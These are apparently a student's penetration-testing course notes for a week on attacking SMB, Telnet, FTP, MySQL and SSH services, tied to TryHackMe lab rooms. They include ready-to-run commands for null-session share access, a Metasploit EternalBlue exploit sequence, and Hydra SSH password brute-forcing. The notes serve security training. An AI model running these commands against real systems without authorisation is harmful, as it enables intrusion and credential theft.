# Week 6 — Network Services (Parts 1, 2, 3)

> **Date:** 2025-02-10 · **Format:** Double session (Part 1 + Part 2, ~230 MB of recorded lecture video) · **Deliverable:** Network Services lab walkthrough (Parts 1-2-3)

## Session Summary

The most content-dense regular session of the course. A three-part hands-on study of common network services, how to enumerate them, and how to exploit the misconfigurations commonly found in each.

## Topics Covered

### Part 1 — SMB / Samba

**Service:** SMB (Server Message Block) / Samba on Linux
**Default ports:** 139/tcp (NetBIOS), 445/tcp (SMB-over-TCP)

**Enumeration:**

```bash
nmap -p 139,445 --script smb-enum-shares,smb-enum-users <target>
enum4linux -a <target>
smbclient -L //<target>/
smbclient -L //<target>/ -U '' -N   # null session
smbmap -H <target>
```

**Common findings:**

- Null sessions (SMB without authentication)
- Readable shares exposing sensitive files
- Guest access to sensitive shares
- SMBv1 enabled (EternalBlue / MS17-010)

**Exploitation path — anonymous share browsing:**

```bash
smbclient //<target>/shareName -U ''
# List files, get/put
```

**Exploitation path — EternalBlue:**

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
exploit
```

![SMB enumeration and null session testing](../screenshots/wk06_network_services_01.png)

### Part 2 — Telnet / FTP

**Telnet (23/tcp)** — plaintext remote shell. Deprecated but still found on legacy devices.

**Attack surface:**

- Banner grabbing for version/device fingerprinting
- Default credentials (often unchanged on network devices)
- Packet capture reveals credentials in plaintext

```bash
telnet <target> 23
# try default creds for known device
```

**FTP (21/tcp)** — file transfer protocol. Plaintext credentials by default.

**Attack surface:**

- Anonymous login (common misconfig)
- Credential discovery via brute-force
- Writable directories enabling malicious uploads
- vsftpd backdoor (2.3.4) — legacy vulnerability

```bash
# Anonymous login test
ftp <target>
# User: anonymous  Pass: (blank)

# Banner check for vulnerable versions
nmap -sV -p 21 <target>
```

**Course connection:** this exact pattern appeared on the **Boiler CTF final exam** — anonymous FTP exposed a hint file with ROT13-encoded text.

![Telnet banner grabbing and FTP anonymous login testing](../screenshots/wk06_network_services_02.png)

### Part 3 — MySQL / SSH

**MySQL (3306/tcp)** — database protocol.

**Attack surface:**

- Remote access enabled (should typically be loopback only)
- Default credentials (`root:(blank)` or `root:root`)
- SQL injection from web apps granting MySQL query execution
- Credential brute-force

```bash
nmap -p 3306 --script mysql-enum,mysql-empty-password <target>
mysql -h <target> -u root -p
```

**SSH (22/tcp)** — secure shell.

**Attack surface:**

- Weak credentials (brute-forceable)
- Key-based auth with reused/compromised keys
- Older versions with protocol vulnerabilities
- `AllowUsers` misconfigurations
- Port-forwarding abuse

```bash
nmap -sV -p 22 <target>
hydra -l <user> -P rockyou.txt ssh://<target>
```

![MySQL remote access testing and SSH brute-force demonstration](../screenshots/wk06_network_services_03.png)

## Key Patterns

1. **Banner grabbing always pays.** Version strings map to CVEs.
2. **Default credentials still work.** Check the default credentials for every discovered service before attempting brute-force.
3. **Plaintext protocols (Telnet/FTP) leak credentials via MITM.** Any authenticated capture reveals the password.
4. **SMB null sessions are common.** Always test them.
5. **MySQL should never be internet-facing.** If it is, default credentials are the first test.

> [!TIP]
> Before reaching for Hydra or an exploit, always try default credentials first. A surprising number of services — especially FTP, MySQL, and Telnet on embedded devices — ship with well-known defaults that are never changed. Five seconds of manual testing can save twenty minutes of brute-forcing.

> [!NOTE]
> Plaintext protocols like Telnet and FTP are largely absent from modern hardened environments, but they remain common on legacy systems, IoT devices, and internal lab networks. Do not skip them in enumeration just because they seem outdated.

## Lab Deliverable

Combined 3-part walkthrough following the tool → reason → expected → actual → screenshot format.

Source file: `Week 6/A00322717 Ross Moravec Network Services (Part 1-2-3).docx` (2.4 MB, 3 screenshot-heavy sections). Recording: two lecture videos totaling ~230 MB.

## TryHackMe Rooms Referenced

- [Network Services](https://tryhackme.com/room/networkservices) — SMB, Telnet, FTP
- [Network Services 2](https://tryhackme.com/room/networkservices2) — NFS, SMTP, MySQL

## Key Takeaway

This was the densest session of the course, and the most directly applicable to real-world pentesting. The discipline of banner grabbing and default credential checking before reaching for an exploit is what separates efficient testers from noisy ones. Every service got the same systematic treatment — enumerate, test defaults, then escalate — and that rhythm is now second nature.

## References from this Session

- [Tools](../references/tools.md)
- [Methodology](../references/methodology.md) — Phase 2 applied per-service

---

_Previous:_ [Week 5](week-05-enumeration-brute-force-openvas.md) · _Next:_ [Week 8 — Midterm](../ctf-walkthroughs/midterm-pickle-rick.md)
